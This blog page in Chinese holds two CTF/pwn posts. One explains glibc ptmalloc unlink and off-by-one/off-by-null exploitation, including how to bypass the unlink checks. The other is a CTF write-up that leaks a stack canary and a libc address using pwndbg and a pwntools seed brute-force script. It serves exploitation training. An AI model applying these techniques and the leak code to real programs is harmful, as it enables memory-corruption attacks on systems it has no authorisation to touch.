<p>chunk将要被free时，通过 <strong>inuse_bit_at_offset</strong> 检测 <strong>后一个</strong> chunk是否为free，如果是的话，将要被free的chunk会把它自己size加上nextsize（后一个chunk的大小），然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>向后合并</strong>（将要被free的chunk作为素材，被前一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982092225-1659683450532.png" class width="1638982092225"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982103542-1659683450532.png" class width="1638982103542"> 
<p>chunk将要被free时，通过 <strong>自己的sizeP位</strong> 检测 <strong>前一个</strong> chunk是否为free，如果是的话，它会把它自己的size加到前一块chunk的size中 ，然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>unlink</strong></p>
<p>unlink是一个宏操作，用于将某一个空闲chunk 从其所处的双向链表中脱链 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//p是某个结构体“malloc_chunk”的地址，*p就是结构体本身（进行了降阶）</span></span><br><span class="line">    FD = P-&gt;fd;		<span class="comment">//FD就是指向下一个结构体的指针</span></span><br><span class="line">    BK = P-&gt;bk;		<span class="comment">//BK就是指向上一个结构体的指针</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;	</span><br><span class="line">        FD-&gt;bk = BK;	<span class="comment">//FD-&gt;bk：下一个结构体中的last</span></span><br><span class="line">        BK-&gt;fd = FD;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unlink执行之前会先进行一个检查：</p>
<ul>
<li>当前这个chunkP的后一个chunk的<strong>fd</strong> == chunkP 是否成立</li>
<li>当前这个chunkP的前一个chunk的<strong>bk</strong> == chunkP 是否成立</li>
</ul>
<p>简单来说，它就是检查了：</p>
<ul>
<li>chunkP的下一个chunk的上一个chunk是不是chunkP</li>
<li>chunkP的上一个chunk的下一个chunk是不是chunkP</li>
</ul>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639014959836-1659683450532.png" class width="1639014959836">  
<p>解释unlink函数：</p>
<ul>
<li>FD-&gt;bk = BK：让P结构体的下一个结构体中的 <strong>bk</strong> 变为 <strong>P本身的bk</strong></li>
<li>BK-&gt;fd = FD：让P结构体的上一个结构体中的 <strong>fd</strong> 变为 <strong>P本身的fd</strong></li>
</ul>
<p>就相当于跳过了<strong>P</strong>这个结构体，把 <strong>FD</strong> 和 <strong>BK</strong> 连接 </p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1660198943002.png" class width="1660198943002">  
<h2 id="off-by-one的利用姿势"><a href="#off-by-one的利用姿势" class="headerlink" title="off-by-one的利用姿势"></a>off-by-one的利用姿势</h2><p>off-by-one有多种利用方式：</p>
<ul>
<li>覆盖低字节数据（如果是地址，还可以改变其指向）</li>
<li>覆盖“size的P位”为“\x00”，伪造上一个为“free chunk”（allocate chunk的“presize”是上一个allocate chunk的数据区，所以可以溢出一字节刚好到P位）</li>
</ul>
<p>常见的造成off-by-one的原因：</p>
<ul>
<li>strlen 和 strcpy 行为不一：strlen 计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 却会拷贝 ‘\x00’ ，导致了off-by-null</li>
<li><em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0：在read写入的字节后加一个“\x00”，这种操作可以中断“打印模块”（许多打印函数会被“\x00”中断），但它也溢出了一个“\x00”出去</li>
</ul>
<p>这里介绍一种特殊的利用姿势，可以实现<strong>WAA</strong>（又叫做Unlink攻击）</p>
<p>条件：可以利用UAF漏洞编辑free chunk</p>
<p>目的：溢出一字节，改变后一个chunk的presize， 导致其<strong>后向合并判断错误</strong></p>
<p>那如果我们在“chunk1”中伪造一个“chunkF”，溢出一字节改变“chunk2”的presize，然后free掉chunk2执行后向合并，就会出现很奇妙的结果</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641459067172-1659683450532.png" class width="1641459067172"> 
<p>​        // 注意：这些操作都是在free chunk中进行的，所以有“presize”</p>
<p>伪装的“chunkF”被“chunk2”当成了合并的目标，如果“chunkF”的“ fd&amp;bk ”控制的好，就可以在通过unlink检查的同时实现<strong>WAA</strong>（write anything anywhere）</p>
<p>​        //这里先简单提一提，到了分析Unlink攻击的再详细分析</p>
<h2 id="libc版本限制"><a href="#libc版本限制" class="headerlink" title="libc版本限制"></a>libc版本限制</h2><p>“libc-2.29.so”及其之后的版本加入了一个chunk检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>需要 prechunk-&gt;size == chunk-&gt;presize</li>
</ul>
<p>由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效，但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk</p>
<p>最后还要绕过 unlink 的检查，如果我们没法 leak heap_base，就要通过以下的办法进行绕过：</p>
<ul>
<li>伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针，以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段 </li>
<li>也可以使用 unsorted chunk 或者 large chunk 的 FD BK 指针，就是对堆风水的要求比较高</li>
<li>PS：伪造的方法在“Unlink攻击”中分析</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/" class="post-title-link" itemprop="url">pwndbg搜索技巧+one_gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-01-06 08:23:52 / Modified: 08:49:56" itemprop="dateCreated datePublished" datetime="2022-01-06T08:23:52+08:00">2022-01-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>pwndbg搜索技巧+one_gadget</strong></p>
<p>这是某个CTF比赛上的题目</p>
<p>记得当时在打比赛时死活搞不出来“__libc_start_main”的偏移量（其实我都已经在GDB中看见了），看国外某大佬的WP后学到了不少关于“pwndbg搜索”的知识</p>
<p>通过这个题目我也纠正了不少概念上的误区，于是在此记录</p>
<hr>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000070341.png" alt="1641000070341"> </p>
<p>循环输入</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000121563.png" alt="1641000121563"> </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000135559.png" alt="1641000135559"> </p>
<p>64位，dynamically，全开</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000226315.png" alt="1641000226315">  </p>
<p><strong>代码分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000431581.png" alt="1641000431581">  </p>
<p>获取数据数到“buf”中</p>
<p>sub_ACA：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000694377.png" alt="1641000694377"> </p>
<p>在s1中读入256字节（遇到“\n”就中断）</p>
<p>小循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000905974.png" alt="1641000905974"> </p>
<p>如果前3个字节是”id “就把“v5”转换为整数并赋值给“v1”，否则就break</p>
<p>大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001004738.png" alt="1641001004738"> </p>
<p>如果前6字节是“create”就执行函数sub_BD1，否则就break</p>
<p>sub_BD1：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001295275.png" alt="1641001295275"> </p>
<p>随机生成一段字符串</p>
<p>特大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001361592.png" alt="1641001361592"> </p>
<p>如果前4字节是“quit”则break结束程序</p>
<p><strong>漏洞分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003509946.png" alt="1641003509946">  </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001641478.png" alt="1641001641478"> </p>
<p>这里就有数组越位和栈溢出</p>
<p>没有system，没有“/bin/sh”</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标</p>
<p><strong>入侵思路</strong></p>
<p>首先考虑绕开PIE和Canary</p>
<p>那么这么泄露地址呢？</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003528827.png" alt="1641003528827"> </p>
<p>输出函数printf可以输出“s”的值，而“s”是用随机数拼凑出来的，而且有memset填充“0”，想控制printf根本不可能</p>
<p>但是有一种邪门的方式可以泄露canary：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647-1641430195129.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标，也就是说，程序会把任何栈上的数据给放入“sub_BD1”进行加密，如果我们对加密后的数据进行分析，说不定就可以还原加密值</p>
<p>那么这里有两个问题需要解决：</p>
<p>1.canary相对于“buf[0]”的偏移</p>
<p>2.获取对应偏移的对应值</p>
<p>第一个问题需要在pwndbg中看： </p>
<p>在函数“sub_BD1”调用时，RAX中的值就是“buf[0]”（在ID那里输入的“0”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0xf593</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0xf593</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] <span class="comment">/* &#x27;create&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al <span class="comment">/* &#x27;&gt; &#x27; */</span></span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffddf0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc60</span> ◂— <span class="number">0xd68</span> <span class="comment">/* &#x27;h\r&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>发现其值为 <strong>“0xf593”</strong> ，用pwngdb查找这个字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0xf593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78381</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78385</span> <span class="number">0x5fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78389</span> <span class="number">0x9ffff59105fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78395</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78399</span> <span class="number">0xf3fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f7839d</span> <span class="number">0xfff58ff3fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f87fe9</span> <span class="number">0xd400019d60fff593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdbfc</span> <span class="number">0xf593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdc76</span> <span class="number">0x86a89b009b7df593</span> </span><br></pre></td></tr></table></figure>
<p>接着找寻canary的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = <span class="number">0x7fffffffe149</span> <span class="meta"># points to (not masked) global canary value</span></span><br><span class="line">Canary    = <span class="number">0x959c7d572835fc00</span> (may be incorrect on != glibc)</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd558</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd5c8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdac8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb28</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb38</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb98</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdc48</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>查找“0x959c7d572835fc00”（canary）的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[anon_7ffff7fb1] <span class="number">0x7ffff7fb6568</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb3e8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb458</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd558</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd5c8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdac8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb28</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb38</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb98</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc48</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdcd8</span> <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>现在我们找到了canary中出现的随机数的地址，还有“buf[0]”中随机数的地址</p>
<p>按道理来说，两者相减就可以得到canary随机数相对于“buf[0]”的偏移了，但是我们却搜索到了多组数据，这是因为这些数据可能在随机数表中多次出现</p>
<p>只有一次一次尝试，把离谱的排除了之后就得到偏移了（相当看脸）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdcd8</span> - <span class="number">0x7fffffffdc76</span> = <span class="number">98</span></span><br><span class="line"><span class="number">98</span> / <span class="number">2</span> = <span class="number">49</span>  <span class="comment">#数组buf的类型为‘int16’</span></span><br></pre></td></tr></table></figure>
<p>第二个问题有一点麻烦：（先看一段代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>): <span class="comment">#循环少了匹配的几率小，循环多了匹配的时间长</span></span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>函数<strong>leak</strong>中的offset其实就是canary在随机数表中的偏移，对应偏移中存放的数据就是canary片段的值，这里我们可以用一个很骚的方式获取这个值</p>
<p>我们直接把canary的偏移输入给程序，程序就会读取canary的值，并且用这个值来生成“32位”字符串，我们这里用循环<strong>“从 0 到 0xffff+1”</strong> 依次生成“32位”字符串，然后把“程序生成的”和“我们生成的”进行对比，如果可以匹配就证明canary的值就是对应的下标</p>
<p>​        // 当然也有小概率会重复，多试几次就好了</p>
<p>解决了canary就要考虑怎么获取shell的问题：</p>
<p>首先程序开了PIE的，ROP基本上废了，需要泄露“__libc_start_main”</p>
<p>我们可以用泄露canary的方式来泄露“__libc_start_main”（就是有一点麻烦）</p>
<p>先在pwndbg中看”buf[0]”的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x9bf0</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0x9bf0</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] /* <span class="string">&#x27;create&#x27;</span> */</span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al /* <span class="string">&#x27;&gt; &#x27;</span> */</span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc70</span> ◂— <span class="number">0xd68</span> /* <span class="string">&#x27;h\r&#x27;</span> */</span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>搜索一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0x9bf0</span></span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7fa54e0</span> <span class="number">0xf5fff69bf0</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc86</span> <span class="number">0x9260245d5a0d9bf0</span></span><br></pre></td></tr></table></figure>
<p>然后不知道从哪里掏出来“main”的返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x555555400d80</span></span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x555555400dfe</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7dea0b3</span> __libc_start_main+<span class="number">243</span></span><br></pre></td></tr></table></figure>
<p>搜索一下这个地址，就得到了存放“返回地址”的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7dea0b3</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdd18</span> <span class="number">0x7ffff7dea0b3</span></span><br></pre></td></tr></table></figure>
<p>两者相减计算偏移：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd18</span> - <span class="number">0x7fffffffdc86</span> = <span class="number">146</span></span><br><span class="line"><span class="number">146</span> / <span class="number">2</span> = <span class="number">73</span></span><br></pre></td></tr></table></figure>
<p>放入刚刚的模块中“__libc_start_main”的地址就有了</p>
